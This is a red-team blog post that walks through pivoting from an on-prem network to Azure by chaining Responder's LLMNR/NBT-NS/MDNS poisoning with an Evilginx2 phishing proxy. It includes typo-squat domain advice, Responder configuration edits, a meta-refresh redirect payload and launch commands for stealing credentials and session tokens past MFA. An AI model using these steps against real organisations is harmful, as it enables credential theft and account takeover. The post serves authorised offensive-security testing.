Screenshots can be found here:  https://web.archive.org/web/20241102072144/https://nullg0re.com/2024/05/cracking-zero-trust-on-prem-to-azure-pivots-with-responder-and-evilginx2/



First things first, as always in these blog posts. Music:


##Credit Where Credit Is Due
I want to first start this post off by stating that this technique was discovered / identified / and curated by none other than my good friend Nevada Romsdahl (Developer of PhishInSuits and SquarePhish). Nevada and I had the pleasure of working closely with each other for many years.

This technique being described in todays blog post was discovered by Nevada in 2023 and showcases a novel way to pivot from on-prem to the cloud while also beating Passwordless, MFA and/or Zero Trust Environments, and my gut tells me that techniques like this are going to become the norm in the years of the future and need to be publicly documented and showcased for the world to see.

The purpose of this blog post is to showcase a novel technique, that could be useful as more organizations adopt more secure authentication internally.

##The Problem Statement
There are two problems that I can identify here:

- Passwordless, MFA and/or Zero Trust Environments
- The need to pivot from on-premise infrastructure to cloud infrastructure
As organizations continue to improve their security posture by implementing security mechanisms that go beyond just password authentication, Red Teamers need to be able to improve their attack sequences to meet the demands of the environments that they are assessing.

When an organization goes to a passwordless or Zero Trust configuration and the organization no longer uses passwords within their environments, going after authentication tokens is where Red Teams need to spend their time.

While companies like Microsoft and Google are making it more feasible for their customers to move towards Zero Trust by disabling password based authentication, they aren’t disabling other protocols that are equally leaving their customers at risk, like Link-Local Multicast Name Resolution (LLMNR), NBT-NS, and MDNS. This leaves organizations at risk to attack tools like Responder and Inveigh.

We can combine Responder / Inveigh with invisible proxies, such as Evilgnx2, in order to steal authentication tokens (in the case of passwordless or Zero Trust environments) or straight up clear text credentials (in the case of just trying to pivot to the cloud from on-prem).

##The Setup
###Evilgnx2
As of this writing, version 3.3.0 is the latest release. The setup is pretty simple:

Purchase a typo-squat domain from a place like GoDaddy (or wherever that lets you create DNS entries).
The typo-squatted domain is important, we want to raise as little suspicion as possible. If the company is nullg0re.com try getting the nullgore.com domain (replace the zero with a lowercase “O”). When the user is tricked into giving up their access, we want them to believe that everything is normal.
Move or download the Evilgnx2 release to a cloud compute system.
Assign DNS records in GoDaddy to your cloud compute systems IP: I.e: www.nullgore.com = <ip-address>, login.nullgore.com = <ip-address>
Start the Evilgnix2 server: ./evilgnix -p /path/to/your/o365-or-glcoud-phishlets
Set the domain
Enable the phishlet. This will tell you if your configuration has an errors, pay attention here cause this will save you time fixing your setup.
Create your lure
Save your lure for later (you will need this in the responder steps)
#Responder
Responder has two files that we need to modify. The Responder.conf file and then we need to create a file called 302.html in the Responder/Files directory.

In the Responder.conf file, we need to open the file and browse down to the section where it says:

; Set to On to serve the custom HTML if the URL does not contain .exe
; Set to Off to inject the 'HTMLToInject' in web pages instead
Serve-Html = Off

; Custom HTML to serve
HtmlFilename = files/AccessDenied.html
And set this value to the following:

; Set to On to serve the custom HTML if the URL does not contain .exe
; Set to Off to inject the 'HTMLToInject' in web pages instead
Serve-Html = On

; Custom HTML to serve
HtmlFilename = files/302.html
Save and close the file.

Next we want to create the Responder/files/302.html file using your preferred text editor, and add the following content to line 1 (replacing <LURE-FROM-EVILGNIX2-STEP-8> with the Lure you created in Evilgnix2 Step 7-8):

```
<meta http-equiv="refresh" content="0; URL='<LURE-FROM-EVILGNIX2-STEP-8>'" />
```
Save and close this file.

Lastly, you want to start Responder in the environment and sit back while waiting for the 302.html file to be served by Responder to the users device and the user to be tricked into entering their credentials into the Evilgnix Invisible proxy.

sudo python3 Responder.py -I eth0 -Pv
So What’s Happening Here
Responder poisons LLMNR, NBT-NS, and MDNS queries, so in a nutshell here’s how the attack is flowing:

Red Teamer kicks off Responder and starts poisoning the environment
User logs into their computer and mis-types a URL into their browser
Computer checks /etc/hosts
Computer checks local DNS
Computer broadcasts to everyone on the broadcast domain over LLMNR the mis-typed hostname
Computer broadcasts to everyone on the broadcast domain over NBT-NS the mis-typed hostname
Computer broadcasts to everyone on the broadcast domain over MDNS the mis-typed hostname
Once the users computer broadcasts to everyone on the broadcast domain over the respective protocol, responder kicks in and says “I HAVE / I AM” that mis-typed hostname, and coerces the users computer to connect back to the responder server
Responder serves up the 302.html file into the users browser, which uses HTML code to automatically redirect the user to the Evilgnx2 invisible proxy
Evilgnx2 intercepts and forwards the users request to login.microsoftonline.com and siphons the users credentials and/or session tokens from the user after they log into the fake login.microsoftonline.com website
Red Team is now able to pivot to the cloud by leveraging the stolen credentials or stealing the users session tokens
Attack in Action
I’ve gone ahead and made a demo video of the attack, please take a look:


Helper Scripts
Secureworks has published a GitHub repository detailing a bash script that can be used to help build out the Responder side of the setup faster and more reliably. That script can be found here.

Conclusion
As organizations begin to move towards passwordless and Zero Trust configurations, its important that we as offensive professionals keep moving the needle too. Long live the cat and mouse game!

